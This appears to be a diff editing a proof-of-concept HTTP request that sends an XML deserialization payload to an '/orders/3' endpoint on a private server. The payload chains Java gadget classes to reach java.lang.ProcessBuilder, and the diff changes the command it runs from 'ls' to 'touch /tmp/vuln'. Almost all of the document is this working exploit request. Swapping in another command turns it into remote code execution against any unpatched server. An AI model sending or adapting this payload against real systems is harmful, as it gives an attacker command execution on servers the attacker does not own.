@@ -1,17 +1,14 @@
 POST /orders/3 HTTP/1.1
 Host: 10.160.11.191:8080
-Proxy-Connection: keep-alive
-Content-Length: 2014
-Cache-Control: max-age=0
-Origin: http://10.160.11.191:8080
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
-Content-Type: application/xml
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
-Referer: http://10.160.11.191:8080/orders/3/edit
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.8
-Cookie: _gitlab_session=de4e739c66f5b892f6386a2d2689486b; JSESSIONID=10830E7168FBEAE80396A8E748587042
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+Cookie: JSESSIONID=035E4D4164C1C1344BE642591A6F4449
+Content-Type: application/xml
+Content-Length: 2052
 
 <map> 
 	<entry> 
@@ -29,7 +26,7 @@ Cookie: _gitlab_session=de4e739c66f5b892f6386a2d2689486b; JSESSIONID=10830E7168F
 										<iter class="java.util.Collections$EmptyIterator"/>
 										<next class="java.lang.ProcessBuilder">
 											<command>
-												<string>ls</string>
+												<string>/usr/bin/touch</string><string>/tmp/vuln</string>
 											</command>
 											<redirectErrorStream>false</redirectErrorStream>
 										</next>
